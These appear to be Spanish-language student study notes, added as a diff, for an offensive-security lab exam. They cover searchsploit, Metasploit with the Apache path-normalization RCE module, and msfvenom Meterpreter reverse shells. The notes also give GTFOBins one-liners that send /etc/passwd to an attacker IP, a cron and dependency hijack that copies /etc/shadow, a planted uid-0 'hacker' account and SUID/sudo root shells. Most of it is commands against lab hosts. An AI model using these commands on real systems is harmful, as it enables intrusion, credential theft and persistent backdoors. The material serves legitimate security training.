+		searchsploit <exploit> -x (salimos de esa pantalla pulsando la tecla "q")
+			Ejemplo:
+				searchsploit linux/dos/16270.c -x
+
+		#### O podemos copiarlo al sistema local así:
+			searchsploit -m <exploit>
+			cat <EDB-ID del exploit.<extension>>
+				Ejemplo:
+					searchsploit -m linux/dos/16270.c
+					cat 16270.c
+
+
+	### Pensamos cómo ejecutarlo:
+		Básicamente compilarlo y ejecutarlo en la maquina atacante.
+
+		OJO: FÍJATE SI EL EXPLOIT ES REMOTO (puedes ejecutarlo desde la atacante) O LOCAL (solo funciona ejecutandolo en la víctima), PARA ELLO FIJATE EN EL NOMBRE, TITULO Y DESCRIPCION DEL EXPLOIT.
+			Si es RCE es remoto
+			Si es Local pues es local
+			Si es DoS es local
+			Si es remote DoS es remoto
+			...
+
+		Al inspeccionar el exploit [searchsploit <exploit> -x (salimos de esa pantalla pulsando la tecla "q")] te ponen cómo usarlo.
+			Ejemplo:
+				gcc 16270.c -o dos_vsftpd
+				./dos_vsftpd <IP victima> <puerto>
+
+
+	### Buscamos el exploit equivalente en la web:
+		https://www.exploit-db.com/exploits/<EDB-ID del exploit>
+			Ejemplo:
+				https://www.exploit-db.com/exploits/16270
+	
+	    Y vemos la info que el exploit proporciona.
+
+----------------------------------------------------------
+# GTFOBins (lista de binarios de Unix que pueden ser explotados para eludir restricciones de seguridad (escalar privilegios, conseguir persistencia (mantener la intrusion), ..., cualquier tecnica de post-explotacion))
+
+## Para la exfiltracion de datos de un sistema remoto:
+	### Wget:
+		En la atacante haces:
+			sudo nc -lvp 80
+
+		En la víctima haces:
+			wget --post-file=/etc/passwd <IP del atacante> (el atacante escucha en el puerto 80 (sudo nc -lvp 80))
+
+	### Whois:
+		En la atacante haces:
+			sudo nc -lvp 43
+
+		En la víctima haces:
+			whois -h <IP del atacante> -p 43 `cat /etc/passwd` (el atacante escucha en el puerto 43 (sudo nc -lvp 43))
+
+	### Bash:
+		En la atacante haces:
+			sudo nc -lvp 8000
+
+		En la victima haces:
+			bash -c 'echo -e "POST / HTTP/0.9\n\n$(</etc/passwd)" > /dev/tcp/<IP del atacante>/8000' (el atacante escucha en el puerto 8000 (sudo nc -lvp 8000))
+
+	### Openssl:
+		En la atacante haces:
+			openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+			openssl s_server -quiet -key key.pem -cert cert.pem -port 8000 > passwd
+
+		En la víctima haces:
+			openssl s_client -quiet -connect <IP del atacante>:8000 < "/etc/passwd"
+
+	### Nc:
+		En la víctima haces:
+			nc -lvp 8000 < fichero_privado.txt
+				Ejemplo:
+					nc -lvp 8000 < /etc/passwd
+
+		En la atacante haces:
+			nc <IP de la víctima> 8000 > datos_robados.txt
+				Ejemplo:
+					nc 192.168.11.3 8000 > passwd_robado_con_nc
+
+	### Curl:
+		En la atacante haces:
+			nc -lvp 80 > data.txt
+				Ejemplo:
+					nc -lvp 80 > passwd_robado_con_curl
+
+		En la víctima haces:
+			curl -X POST -d @data.txt <IP del atacante>
+				Ejemplo:
+					curl -X POST -d @/etc/passwd 192.168.11.2
+
+	### Finger:
+		En la atacante haces:
+			sudo nc -lvp 79
+
+		En la víctima haces:
+			finger "$(cat /etc/passwd)@<IP del atacante>" (el atacante escucha en el puerto 79 (sudo nc -lvp 79))
+
+	### Php:
+		En la víctima haces:
+			php -S 0.0.0.0:8080
+
+		En la atacante haces:
+			wget <IP de la víctima>:8080/data.txt 
+
+			Ese data.txt es un fichero que se encuentra en el mismo directorio que en el que la victima ejecutó la anterior orden, no funciona cambiar el data.txt por /etc/passwd
+
+	### Scp: 
+		Es una herramienta de transferencia segura de ficheros que también puede usarse para esto.
+			scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2
+
+
+NOTA: Un mod_security (WAF) puede prevenir varias de las tecnicas de exfiltracion vistas.
+
+----------------------------------------------------------
+# Metasploit Framework (MSF) [ESTAS ANOTACIONES SON DE LA PREPARACION DEL EXAMEN, LAS DE CLASE ESTAN EN "COMANDOS PARA EL PRACTICO" |||| USA ESTAS ANOTACIONES]
+
+CHEATSHEET EN LA PÁGINA 5 DEL LAB 12-13
+
+## Iniciar MSF:
+	### Iniciamos la BBDD de MSF:
+		sudo service postgresql start
+
+	### Iniciamos MSF:
+		sudo msfdb init (esto crea las tablas de la BBDD de MetaXploit)
+
+	### Arrancamos la consola de MSF (tarda un tiempo en mostrar el prompt):
+		sudo msfconsole -q
+
+	### Comprobamos que la BBDD de MSF esté funcionando bien:
+		db_status (Tiene que salir el mensaje "postgresql connected to msf")
+
+
+## Uso básico de MSF:
+	### Para ver los espacios de trabajo que existen actualmente:
+		workspace
+
+		El workspace por defecto es: default
+			 Se selecciona al conectarse a la BBDD, y se representa con * junto a su nombre
+
+
+	### Para crear un nuevo espacio de trabajo:
+		workspace -a <nombre espacio de trabajo>
+			Ejemplo:
+				workspace -a lab12
+
+
+	### Para eliminar el espacio de trabajo:
+		workspace -d <nombre espacio de trabajo>
+			Ejemplo:
+				workspace -d lab12
+
+
+	### Para cambiar de espacio de trabajo:
+		workspace <nombre del workspace>
+			Ejemplo:
+				workspace lab12
+
+
+## Encontrar un exploit que podamos usar:
+	### Enumerar los servicios (con sus versiones) del objetivo con nmap (o db_nmap (guarda los resultados en el workspace de MSF) [SE USA DESDE LA msfconsole]):
+		db_nmap -sV <IP objetivo>
+			Ejemplo:
+				db_nmap -sV 172.25.0.3
+
+
+	### Buscamos en una BBDD CVE (Ej: http://www.cvedetails.com/) los exploits disponibles para los servicios encontrados:
+		#### Click en "Version Search" dentro del desplegable "Vulnerable Software" del panel lateral izquierdo.
+			Vendor Name: <nombre del vendedor del producto [el primer nombre en de cada servicio en la columna "VERSION"]>
+			Product Name: <nombre del servicio [está en la columna "SERVICE" de nmap]>
+			Version: <version del servicio>
+
+				Ejemplos:
+					##### Para vsftpd (no encontramos nada)
+						Vendor Name: vsftpd
+						Product Name: ftp
+						Version: 3.0.5
+
+					##### Para OpenSSH (no encontramos nada)
+						Vendor Name: OpenSSH
+						Product Name: ssh
+						Version: 8.2p1
+
+					##### Para Apache (encontramos sus CVEs)
+						Vendor Name: Apache
+						Product Name: http
+						Version: 2.4.41 (las anotaciones se explican con esta version que no tienen un exploit publicado en ExploitDB, en el guión se busca para la version 2.4.50 la cual sí tiene el exploit publicado en ExploitDB. Por tanto, si en este bloque de las anotaciones ves que hay incoherencias en las versiones es por esto)
+
+
+		#### Nos interesan los CVEs (recuerda que cuanto mayor sea su CVSS, más grave es la vulnerabilidad que documenta [escala hasta el nº 10 de gravedad]) que tengan la etiqueta "Public exploit", copiamos el "nombre" del CVE y lo buscamos en ExploitDB (http://www.exploit-db.com/).
+			Ejemplo de "nombre" de CVE: CVE-2021-40438
+
+			En ExploitDB pones en el buscador el nombre del CVE sin "CVE-", es decir, siguiendo el ejemplo anterior sería:
+				"2021-40438"
+
+			Ya tienes ahí el exploit de la vulnerabilidad
+
+
+		#### Buscamos en la BBDD de exploits de MSF los (módulos que contienen) exploits para apache 2.4.50
+			search <palabras clave>
+				Ejemplos:
+					search apache
+					search apache 2.4
+					search apache 2.4.50
+					search cve-2021-41773
+					
+			Cada valor de la columna "Name" es el nombre de un módulo que contiene un exploit, para la version de apache con la que trabajamos (2.4.50) usaremos el módulo llamado:
+				exploit/multi/http/apache_normalize_path_rce
+
+
+		#### Consultamos el payload a usar con el exploit:
+			show payloads
+
+
+			##### Filtramos los payloads de la siguiente forma:
+				search payload/linux -t reverse
+					Donde:
+						linux: es el SO de la victima
+						-t reverse: es para filtrar los payloads por conexiones TCP inversas [REVERSE SHELL] (PARA EVITAR FIREWALLS)
+
+
+			##### Elegimos el payload a utilizar observando que en el nombre del payload está la "configuracion" del payload deseado.
+				Ejemplo:
+					Que sea para un SO Linux,
+						search payload/linux
+					Que queremos usar una conexion TCP inversa (reverse shell),
+						search payload/linux -t reverse
+					Que la arquitectura de la víctima es x64,
+						search payload/linux/x64 -t reverse
+					Que queremos utilizar Meterpreter,
+						search payload/linux/x64/meterpreter -t reverse
+					Que queremos un payload inline (stageless) [funciona mejor en un entorno docker que el Stager],
+						A ojo fiera que nun sé el parametru y grep nun furrula en MSF
+
+
+					El payload resultante es el siguiente:
+						payload/linux/x64/meterpreter_reverse_tcp
+
+
+		#### Probamos el exploit con MSF:
+			use <nombre módulo que contiene el exploit>
+			set PAYLOAD <nombre del payload SIN EL "payload/">
+			show OPTIONS (hay que dar valor a los campos obligatorios que no tengan ya valor)
+			set <opcion> <valor>
+			...
+			set <opcion N> <valor N>
+			exploit
+
+
+			Ejemplo:
+				use exploit/multi/http/apache_normalize_path_rce
+				set PAYLOAD linux/x64/meterpreter_reverse_tcp
+				show OPTIONS
+				set LHOST 172.25.0.2
+				set RHOSTS 172.25.0.3
+				exploit
+
+
+			Ejemplo con un módulo auxiliar de MSF (CON LOS MODULOS AUXILIARES NO HAY QUE HACER SET PAYLOAD):
+				##### Módulo auxiliar "ftp_login" (encontramos su nombre completo con "search ftp_login"):
+					Es para hacer fuerza bruta a un servidor FTP presente en la víctima para obtener las credenciales de acceso a dicho servidor
+
+				use auxiliary/scanner/ftp/ftp_login
+				info auxiliary/scanner/ftp/ftp_login (para ver todos los parámetros deseados)
+				set RHOSTS 172.25.0.3
+				set USERNAME root
+				set PASS_FILE /wordlist/2020mostcommon.txt
+				exploit
+				
+				
+## Payloads con msfvenom y multi/handler (RECUERDA QUE MSFVENOM NO SE EJECUTA EN LA CONSOLA DE MSF SINO, EN NUESTRO CASO (MAQUIN ATACANTE: KALI), EN LA KALI FUERA DE MS):
+	CHEATSHEET EN LA PÁGINA 8 DEL LAB 12-13 [ES MUY CLAVE, ESTAN AHI LAS ORDENES PARA HACER COPIA PEGA]
+
+	### Creacion de un payload personalizado para explotar una pagina web vulnerable:
+		RECUERDA: El directorio usado por defecto para alojar webs que se puedan servir directamente al exterior es /var/www/html
+
+		#### Payload de Meterpreter reverse shell con PHP (RECUERDA QUE MSFVENOM NO SE EJECUTA EN LA CONSOLA DE MSF SINO, EN NUESTRO CASO (MAQUIN ATACANTE: KALI), EN LA KALI FUERA DE MS):
+			msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address (la del atacante)> LPORT=<Local Port (el del atacante)> -f raw > shell.php
+				Ejemplo:
+					msfvenom -p php/meterpreter_reverse_tcp LHOST=172.25.0.2 LPORT=777 -f raw > shell.php
+
+			##### Lo pasamos a la víctima creando un servidor web temporal con Python para transferir el archivo de la máquina atacante a la víctima.
+				
+				###### En la máquina atacante:
+					python3 -m http.server <puerto>
+						Ejemplo:
+							python3 -m http.server 888
+
+				###### En la máquima víctima:
+					wget <IP atacante>:<puerto>
+					-O-
+					wget <IP atacante>:<puerto>/<fichero a recibir> -O <ruta de destino para el fichero transferido>
+						Ejemplo:
+							wget 172.25.0.2:888/shell.php -O /var/www/html/shell.php
+
+
+			##### Ejecutamos el payload con el modulo /multi/handler (HAY QUE CONFIGURARLO IGUAL QUE EL PAYLOAD TRANSFERIDO A LA VÍCTIMA):
+				use exploit/multi/handler
+				set PAYLOAD php/meterpreter_reverse_tcp
+				set RHOST 172.25.0.3 (en el payload no hay ningun RHOST, pero lo hacemos por si acaso?)
+				set LHOST 172.25.0.2
+				set LPORT 777
+				exploit -j
+
+
+				###### Ahora la víctima tiene que ejecutar el payload para establecer la conexion.
+					####### Vía browser desde la MV Ubuntu host:
+						http://172.25.0.3/shell.php
+
+					####### Vía terminal:
+						php -f shell.php
+
+
+				###### Si todo ha salido bien tendría que salir un mensaje en MSF de que se ha abierto una sesion.
+					Para enumerar las sesiones disponibles (listarlas):
+						sessions -l
+
+					Para iniciar sesión en una sesión:
+						sessions -i <ID de la sesión>
+							Ejemplo:
+								sessions -i 1
+
+
+				###### Ya estamos en un shell Meterpreter completamente activo
+					Podemos usar sus funcionalidades para probar técnicas de post-explotación
+
+					####### Puedes escribir help para ver los comandos disponibles
+						# Cargar cualquier archivo en la maquina explotada:
+							## En el shell de Meterpreter:
+								upload <ruta al archivo de la maquina atacante> <ruta de destino en la victima>
+									Ejemplo:
+										upload /wordlist/2020mostcommon.txt 2020mostcommon.txt
+
+						# Si escribes shell:
+							Te saca de Meterpreter y te da acceso directo a la shell del SO de la víctima.
+							Con esto puedes hacer whoami
+
+
+		#### Payload de Meterpreter reverse shell con Python (RECUERDA QUE MSFVENOM NO SE EJECUTA EN LA CONSOLA DE MSF SINO, EN NUESTRO CASO (MAQUIN ATACANTE: KALI), EN LA KALI FUERA DE MS):
+			msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP atacante> LPORT=<puerto> -f raw > shell.py
+				Ejemplo (no te rayes por los mensajes de "error", son warnings pero el payload se genera bien):
+					msfvenom -p python/meterpreter/reverse_tcp LHOST=172.25.0.2 LPORT=4444 -f raw > shell.py
+
+			##### Lo pasamos a la víctima creando un servidor web temporal con Python para transferir el archivo de la máquina atacante a la víctima.
+				
+				###### En la máquina atacante:
+					python3 -m http.server <puerto>
+						Ejemplo:
+							python3 -m http.server 777
+
+				###### En la máquima víctima:
+					wget <IP atacante>:<puerto>
+					-O-
+					wget <IP atacante>:<puerto>/<fichero a recibir> -O <ruta de destino para el fichero transferido>
+						Ejemplo:
+							wget 172.25.0.2:777/shell.py -O /tmp/shell.py (es el mismo directorio en el que se encuentra el proceso a reemplazar (el proceso a modificar). En un principio vale cualquier directorio ya que al final vamos a modificar el mismo proceso)
+
+			##### Como este ejercicio consiste en reemplazar procesos cron (o dependencias de ejecutables, yo hice el "reemplazo" [incluí la carga util en un proceso cron ya existente] de procesos), incluimos el contenido del payload generado en un proceso cron existente.
+				
+				###### En la víctima haces:
+					cat shell.py >> integrity_check.py
+
+					Comprobamos la salida de los procesos cron con:
+						tail -f /var/log/cron.log
+
+			##### Ejecutamos el payload con el modulo /multi/handler (HAY QUE CONFIGURARLO IGUAL QUE EL PAYLOAD TRANSFERIDO A LA VÍCTIMA):
+				use exploit/multi/handler
+				set PAYLOAD python/meterpreter/reverse_tcp
+				set RHOST 172.25.0.3 (en el payload no hay ningun RHOST, pero lo hacemos por si acaso?) [IP victima]
+				set LHOST 172.25.0.2 [IP atacante]
+				set LPORT 4444
+				exploit -j
+
+
+				###### Si todo ha salido bien tendría que salir un mensaje en MSF de que se ha abierto una sesion.
+					Para enumerar las sesiones disponibles (listarlas):
+						sessions -l
+
+					Para iniciar sesión en una sesión:
+						sessions -i <ID de la sesión>
+							Ejemplo:
+								sessions -i 2
+
+
+				###### Ya estamos en un shell Meterpreter completamente activo
+					Podemos usar sus funcionalidades para probar técnicas de post-explotación
+
+					####### Puedes escribir help para ver los comandos disponibles
+						# Cargar cualquier archivo en la maquina explotada:
+							## En el shell de Meterpreter:
+								upload <ruta al archivo de la maquina atacante> <ruta de destino en la victima>
+									Ejemplo:
+										upload /wordlist/2020mostcommon.txt 2020mostcommon.txt
+
+						# Si escribes shell:
+							Te saca de Meterpreter y te da acceso directo a la shell del SO de la víctima.
+							Con esto puedes hacer whoami
+
+----------------------------------------------------------
+# Reemplazo de dependencias de ejecutables
+
+	## Para exfiltrar datos privados:
+		### Examinamos el fichero a reemplazarle las dependencias
+			nano main_check.py
+
+		### Creamos una version maliciosa de esa dependencia que carga para que lea /etc/shadow
+			mv /tmp/file_check.py /tmp/file_check.py-ORIGINAL (para tener una copia del original)
+			nano /tmp/file_check.py
+
+				#### Ponemos el siguiente contenido en la version maliciosa de la dependencia
+					import os
+					
+					def check_file_integrity (): ## el modulo que carga esta dependencia llama a esta funcion
+						os.system("cp /etc/shadow /tmp/shadow_exfiltrado_reemplazando_dependencias")
+						os.system("chmod 644 /tmp/shadow_exfiltrado_reemplazando_dependencias") (para que un usuario sin privilegios lo pueda leer)
+						print("shadow exfiltrado reemplazando dependencias")
+
+					Esta version maliciosa exfiltrará el contenido de /etc/shadow a un lugar donde tu usuario normal (sin privilegios) pueda leerlo.
+
+		### Ejecutamos el programa que carga la dependencia reemplazada
+			python3 main_check.py
+				
+				#### Con un usuario sin privilegios (testUser):
+					El main_check.py funciona menos la parte en la que la dependencia reemplazada cambia los permisos del shadow exfiltrado para que un usuario sin privilegios lo pueda leer.
+
+					Esto es porque, aunque el main_check.py lo haya creado root y la dependencia la haya creado root (en el caso de modificar la existente en lugar de crear un nuevo fichero con testUser), el main_check.py SE VA A EJECUTAR CON LOS MISMOS PERMISOS QUE LOS DEL USUARIO QUE EJECUTA EL MAIN_CHECK.PY
+	
+					TestUser tendrá los permisos suficientes para copiar el /etc/shadow, pero no para cambiar los permisos de /etc/shadow ni de su copia. Además de que la copia tendrá el mismo creador y grupo que el original
+
+					Habría que esperar a que un usuario con los suficientes permisos ejecutase el main_check.py para que los permisos que cambiasen en la copia exfiltrada y que testUser pueda ver el contenido de la copia exfiltrada
+
+				
+				#### Con root:
+					Que los permisos de la copia se cambiaron porque el main_check.py lo ejecutó un usuario con los permisos suficientes y ahora testUser puede leer el contenido filtrado.
+
+----------------------------------------------------------
+# Trabajos cron (se puede usar para hacer escalada de privilegios)
+
+Las tareas programadas de todo el sistema se pueden consultar en el archivo /etc/crontab.
+
+NOTA: la salida de los procesos administrados por cron se puede ver en /var/log/cron.log
+
+	## Programa Python modificado para leer un /etc/shadow mediante cron y volcar la salida a un fichero:
+		from os import system
+		system("cat /etc/shadow > /tmp/shadow_leido")
+
+	## Programa Python modificado para exfiltrar datos:
+		from os import system
+		system("cat /etc/shadow > /tmp/shadow") ## Volcamos la salida al mismo directorio en el que se encuentra el programa Python
+		system("python3 -m http.server 888")
+
+		### En la máquina atacante:
+			wget <IP victima>:888/<fichero a recibir> -O <ruta de destino para el fichero transferido>
+				Ejemplo:
+					wget 172.25.0.3:888/shadow_leido -O shadow_robado
+
+----------------------------------------------------------
+# Saber qué comandos podemos ejecutar con sudo con nuestro usuario.
+sudo -l
+
+----------------------------------------------------------
+# Ficheros /etc/passwd y /etc/shadow.
+
+## cat /etc/shadow: Tiene los hashes de las contraseñas de los usuarios
+
+## cat /etc/passwd: Tiene los usuarios
+	### Formato de cada línea:
+		<nombre de usuario>:<contraseña con sal generada>:<identificador de usuario>:<identificador
+de grupo>:<nombre principal del grupo>:<ruta a su directorio home>:<shell>
+			Donde:
+				Si <contraseña con sal generada> es "x" => significa que la contraseña se almacena en /etc/shadow (un fichero con permisos mas restrictivos)
+
+				Los usuarios root tienen los valores:
+					<identificador de usuario> con valor: 0
+					<identificador de grupo> con valor: 0
+					<nombre principal del grupo> con valor: root
+
+
+	### Un usuario "hacker" con "poderes" de root sería así (reutilizamos un directorio de inicio (home) existente para evitar crear uno nuevo):
+		hacker:<contraseña con sal generada>:0:0:root:/root:/bin/bash
+
+		#### Para generar la contraseña usamos la herramienta mkpasswd
+			mkpasswd --help
+
+				mkpasswd -s
+					Pide la contraseña desde la entrada estandar (por teclado)
+				
+				mkpasswd -m sha-256 -s
+					Pide la contraseña desde la entrada estandar (por teclado)
+					Utiliza el método hash sha-256 (recuerda que sha-128 no es seguro, utilizar a partir de sha-256 [incluido] para arriba (sha-256, sha-512, ...))
+
+				mkpasswd -m sha-512 -s
+					Pide la contraseña desde la entrada estandar (por teclado)
+					Utiliza el método hash sha-512
+
+
+		MUY IMPORTANTE: EL MÉTODO HASH DE LAS CONTRASEÑAS DE PASSWD ES sha-256
+			mkpasswd -m sha-256 -s
+				
+				Ejemplo de entrada válida:
+					hacker:$5$Aiuh1iiKFC$YNj26JWLardFwpcsyUv4GLCHnf2Kk8gg5XM0CgAn.xC:0:0:root:/root:/bin/bash
+
+----------------------------------------------------------
+# Generar contraseña segura.
+Usar la herramienta mkpasswd (la ayuda se accede con mkpasswd --help)
+
+	Ejemplo funcional:
+		mkpasswd -m sha-512 -s (Usar SHA-512 y pedir la contraseña desde la entrada estándar)
+
+APUNTAR PARA HACER CONTRASEÑAS VALIDAS PARA /etc/passwd
+APUNTAR CÓMO AÑADIR UN USUARIO NUEVO EN /etc/passwd
+
+----------------------------------------------------------
+# Programas SUID (SETUID o SETGID/SETGUID)
+
+## Puedes encontrar todos los ejecutables instalados actualmente con estos bits habilitados con:
+	find / -perm -u=s -type f 2>/dev/null
+
+
+## Activar el bit para cualquier ejecutable existente:
+	chmod +s <ejecutable>
+
+
+## Ejecutables SetUID + GTFOBins:
+	### Para leer el contenido de /etc/shadow, incluso aunque se trate de un archivo muy protegido:
+		cat /ect/shadow
+
+	### Para reemplazar el /etc/passwd por otro:
+		echo "$(cat passwd_modificado)" | cp /dev/stdin "/etc/passwd"
+
+	### Para obtener un shell como root en el sistema local [Buscar funcionalidad "sudo" en los GTFOBins (solo funcionará si podemos ejecutarlo con sudo)]:
+		sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+
+			#### Para salir: exit
+					
+	
+	Para que los programas SUID funcionen como GTFOBins se necesita:
+		1. Que el ejecutable tenga el bit SUID activado
+			chmod +s <ejecutable>
+
+			Este bit permite que el prgrama se ejecute CON LOS PERMISOS DEL PROPIETARIO DEL ARCHIVO, no del usuario que lo ejecuta.
+
+		2. El propietario del ejecutable debe ser root
+
+		3. No debe tener restricciones del sistema como noexec o AppArmor/SELinux.
+			Algunas protecciones como:
+
+    				mount -o noexec
+
+				AppArmor o SELinux
+
+				PAM
+
+			pueden impedir que el binario escale, incluso con SUID.
+
+----------------------------------------------------------
+# Strings (para inspeccionar cualquier archivo ejecutable binario)
+
+Nos permite ver datos privados hardcodeados => Podemos hacer una escalada de privilegios con ello
+
+## Uso:
+	strings <ejecutable>
+		Ejemplo:
+			strings /main_check.py
+			strings /bin/cp
+
+		Te saldrá el código fuente del ejecutable y con ello puedes comprobar si hay datos privados hardcodeados en el código fuente.
+	
+		Si hay datos privados hardcodeados en el codigo fuente => se pueden usar para hacer escaladas de privilegios
+
+
+## Forma de evitar este tipo de tecnicas => ofuscar el codigo
+	O para los datos privados:
+		Ofuscarlos o, mucho mejor, que se obtengan de fuentes cifradas externas
+
+----------------------------------------------------------
+# Obtencion de los datos necesarios para agregar un usuario en /etc/passwd
+
+## Formato passwd:
+	<nombre de usuario>:<contraseña con sal generada>:<identificador de usuario>:<identificador de grupo>:<nombre principal del grupo>:<ruta a su directorio home>:<shell>
+
+	1º) <nombre de usuario>
+		El nombre que quieres que tenga el usuario
+
+
+	2º) <contraseña con sal generada>
+		# Si el valor aquí es "x" => Indica que la contraseña se almacena en /etc/shadow
+			## Modificamos el fichero:
+				sudo nano /etc/shadow
+				
+				### Añadimos la línea:
+					<nombre del nuevo usuario>:<contraseña hecha usando sha-256>:<numero que te flote el barco>:0:<el numero mas alto posible>:7:::
+
+		# Pones la contraseña creada con mkpasswd (usando sha-256)
+			mkpasswd -m sha-256 -s
+
+
+	3º) <identificador de usuario>
+		# Si el usuario debe ser nuevo y no vale suplantar a otro existente en el sistema:
+			Te inventas el número comprobando que no lo tenga ya otro usuario en passwd
+
+		# En caso contrario, puedes usar un identificador de usuario ya existente
+
+
+	4º) <identificador de grupo>
+		# Si quieres añadir el usuario a un grupo existente, puedes ver el ID de cada grupo (GID) con:
+			getent group
+
+		# Si necesitas crear un nuevo grupo:
+			## Modificamos el fichero:
+				sudo nano /etc/group
+
+				### Añadimos la linea:
+					<nombre del nuevo grupo>:<contraseña del grupo (si pones "x" la contraseña se añade en /etc/gshadow):<ID del grupo (asegurate de que no se repita con otro)>:
+			
+			## Modificamos el fichero:
+				sudo nano /etc/gshadow
+
+				### Añadimos la linea:
+					<nombre del nuevo grupo>:!(para que no tenga contraseña el grupo)::
+
+
+	5º) <nombre principal del grupo>
+		# Lo puedes dejar vacío o, generalmente se suele poner el mismo valor que el nombre del usuario o es un nombre mas explicativo de lo que representa el usuario
+
+
+	6º) <ruta a su directorio home>
+		# Si el usuario a crear es completamente nuevo:
+			## Tienes que ir a:
+				cd /home
+
+			## Y hacer:
+				mkdir <nombre del directorio home del nuevo usuario>
+
+			Pones la ruta del directorio creado (/home/<nombre del directorio home del nuevo usuario>)
+				OJO: La del directorio home de root es: /root
+
+		# En caso contrario, puedes usar uno repetido
+
+
+	7º) <shell>
+		# Si se podrá iniciar sesion con el nuevo usuario creado, ponemos el valor: /bin/bash
+		
+		# En caso contrario, ponemos el valor: /usr/sbin/nologin
+
